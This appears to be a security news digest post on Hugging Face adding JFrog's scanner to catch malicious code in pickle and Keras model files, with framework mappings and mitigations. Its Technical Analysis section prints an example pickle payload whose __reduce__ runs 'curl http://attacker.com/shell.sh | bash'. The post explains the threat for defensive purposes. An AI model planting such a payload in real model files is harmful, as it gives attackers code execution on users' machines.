---
title: "Hugging Face and JFrog partner to make AI Security more transparent"
date: 2026-04-28T04:49:16+00:00
draft: true
slug: "hugging-face-and-jfrog-partner-to-make-ai-security-more-transparent"

# ── Content metadata ──
summary: "Hugging Face has integrated JFrog's security scanner into its Hub platform to improve detection of malicious code embedded in serialized model weights, particularly targeting pickle and Keras Lambda layer exploits. The partnership aims to reduce false positives by performing deeper code analysis beyond simple pattern matching. This represents a meaningful defensive step for ML supply chain security, given Hugging Face's scale of hundreds of millions of model files."
source: "Hugging Face Blog"
source_url: "https://huggingface.co/blog/jfrog"
source_date: 2025-03-04T00:00:00+00:00
author: "Grid the Grey Editorial"
thumbnail: "https://images.pexels.com/photos/1089438/pexels-photo-1089438.jpeg?auto=compress&cs=tinysrgb&h=650&w=940"
# To override: find a photo on pexels.com, right-click → Open image in new tab, paste URL above

# ── AI Security Classification ──
relevance_score: 7.2
threat_level: "MEDIUM"

# ── MITRE ATLAS Techniques ──
mitre_techniques: ["AML.T0010 - ML Supply Chain Compromise", "AML.T0018 - Backdoor ML Model", "AML.T0019 - Publish Poisoned Datasets"]

# ── OWASP LLM Top 10 ──
owasp_categories: ["LLM05 - Supply Chain Vulnerabilities"]

# ── TL;DR ──
tldr_what: "Hugging Face integrates JFrog scanner to detect malicious code in serialized model weights at scale."
tldr_who_at_risk: "Any developer or organisation downloading models from Hugging Face Hub is at risk of executing malicious code embedded in pickle or Keras-format model files."
tldr_actions: ["Review all downloaded Hugging Face models for JFrog scan results before loading into any environment", "Prefer safe serialization formats such as SafeTensors over pickle-based formats when sharing or consuming models", "Implement sandboxed model loading environments to contain any arbitrary code execution attempts"]

# ── Taxonomies ──
categories: ["Supply Chain", "Industry News", "Research"]
tags: ["hugging-face", "jfrog", "model-security", "pickle-exploit", "serialization", "arbitrary-code-execution", "supply-chain", "ml-security", "scanner", "model-hub"]
frameworks: ["mitre-atlas", "owasp-llm"]
threat_actors: ["cybercriminal", "researcher"]

# ── Pipeline metadata ──
fetched_at: "2026-04-28T04:49:16+00:00"
feed_source: "huggingface"
original_url: "https://huggingface.co/blog/jfrog"
pipeline_version: "1.0.0"
---

## Overview

Hugging Face has announced a security partnership with JFrog, integrating JFrog's advanced malware scanner directly into the Hugging Face Hub platform. The move is a direct response to the persistent threat of malicious code being embedded within serialized model weight files — a vector that has become increasingly relevant as the Hub hosts millions of publicly accessible model repositories. The integration is automatic and requires no action from repository owners or consumers.

## Technical Analysis

The core vulnerability class addressed here is **arbitrary code execution via deserialization**. Python's `pickle` format, widely used for serializing ML model weights, executes arbitrary Python code during the deserialization (`unpickling`) process. An attacker hosting a model on Hugging Face could embed a malicious `__reduce__` method in a pickled object, which executes upon a victim loading the model.

Similarly, **Keras Lambda layers** allow embedding arbitrary Python functions directly into saved models, which execute at inference time — another well-documented arbitrary code execution pathway.

The existing `picklescan` tool used by Hugging Face operates on pattern matching against known dangerous module names (e.g., `os`, `subprocess`). This approach generates false positives when legitimate developer code uses these modules non-maliciously. JFrog's scanner goes further by parsing and semantically analysing the embedded code to assess *intent and potential impact*, reducing false positive rates while improving detection of novel or obfuscated payloads.

```python
# Example: malicious pickle payload concept
import pickle, os
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/shell.sh | bash',))

payload = pickle.dumps(Exploit())
# Victim executes: pickle.loads(payload) -> RCE
```

## Framework Mapping

- **AML.T0010 (ML Supply Chain Compromise):** The primary threat vector — adversaries publishing trojanised models to a trusted public repository to compromise downstream users.
- **AML.T0018 (Backdoor ML Model):** Malicious serialized code could establish persistence or exfiltrate data upon model load, effectively backdooring the consumer's environment.
- **AML.T0019 (Publish Poisoned Datasets):** While focused on models here, the same supply chain logic applies to datasets with embedded executable components.
- **LLM05 (Supply Chain Vulnerabilities):** Directly applicable — the Hub functions as a critical supply chain node for the global ML community.

## Impact Assessment

Hugging Face is the dominant public repository for ML models, with millions of repositories and hundreds of millions of files. Even a small percentage of malicious uploads could affect a significant number of downstream users — from individual researchers to enterprise deployments. The arbitrary code execution risk is particularly severe in CI/CD pipelines that automatically pull and test new model versions, where malicious payloads could compromise build infrastructure.

## Mitigation & Recommendations

1. **Check scan results** before loading any model from the Hub; look for JFrog scanner badges on repository pages.
2. **Prefer SafeTensors format** over pickle-based formats when possible — SafeTensors is designed to prevent code execution during deserialization.
3. **Sandbox model loading** using isolated containers or VMs, especially for models from unknown or low-reputation sources.
4. **Pin model versions** using commit hashes rather than floating `main` branch references to prevent silent supply chain substitution.
5. **Monitor egress traffic** from model-loading environments to detect beaconing behaviour indicative of successful RCE.

## References

- [Hugging Face Blog — JFrog Partnership](https://huggingface.co/blog/jfrog)
- [Hugging Face Security Documentation](https://huggingface.co/docs/hub/security)
- [JFrog Model Threats Page](https://jfrog.com/)
